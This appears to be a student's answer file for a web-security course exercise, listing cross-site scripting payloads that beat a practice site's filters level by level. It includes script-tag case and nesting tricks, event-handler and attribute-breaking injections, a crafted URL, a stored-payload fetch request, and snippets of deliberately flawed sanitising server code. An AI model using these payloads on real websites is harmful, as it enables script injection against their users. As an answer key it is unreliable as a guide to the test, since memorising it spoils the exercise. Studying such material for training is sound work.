# 0. Welcome

N/A

# 1. A Truly Disruptive Startup (3 points)

```
<script>success()</script>
```

# 2. No Script Allowed (3 points)

```
<script>success()</script>
```

# 3. One More Time, Like You Mean It (3 points)

```
<sscriptcript>success()</sscriptcript>
```

# 4. An Open-and-Shut Case (3 points)

```
<SCRIPT>success()</SCRIPT>
```

# 5. Time to Mix Things Up (3 points)

```
<sCrIpT>success()</sCrIpT>
```

# 6. A Picture is Worth a Thousand Words (3 points)

```
<img src='x' onerror='success()'>
```

# 7. Between a Rock And a Hard Place (3 points)

```
<body onpageshow=success()></body>
```

# 8. Angle of Death (6 points)

Attack input:

```
<<script>>success()</script>
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  q = q.replace('<', '')
  q = q.replace('>', '')

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 9. All in a Day's Work

N/A

# 10. In the Wrong Place at the Wrong Time (3 points)

```
"onload=success()
```

# 11. You Can't Win 'em All (6 points)

Attack input:

```
""onload=success()
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  q.replace('"', '&quot;')

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 12. When All is Said and Done (6 points)

Attack input:

```
'onload=success()
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  q.replaceAll('"', '&quot;')

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 13. When You Want a Job Done Right

N/A

# 14. Here Today and Gone Tomorrow (3 points)

Attack URL:

```
http://caloogle.xyz:4140/search?q=&lang=es%20onload=success()
```

# 15. The Early Bird Catches the Worm (3 points)

```
</script><script>success()</script>
```

# 16. Tying Up Loose Ends (3 points)

```
</<<//script><script>success()</<<//script>
```

# 17. Take a Page Out of Their Book (6 points)

Attack code:

```js
fetch('/comment',{
	method:'POST',
	headers:{
		'Content-Type':'application/json'
	},
        body:'{"text":"search","id":"success()"}'
})
.then(function(response){
	response.json()
})
.then(function(data){
	window.location.reload();
});
```

# 18. Congrats

N/A

# Survey responses (3 points)

Write your survey responses in SURVEY.md!
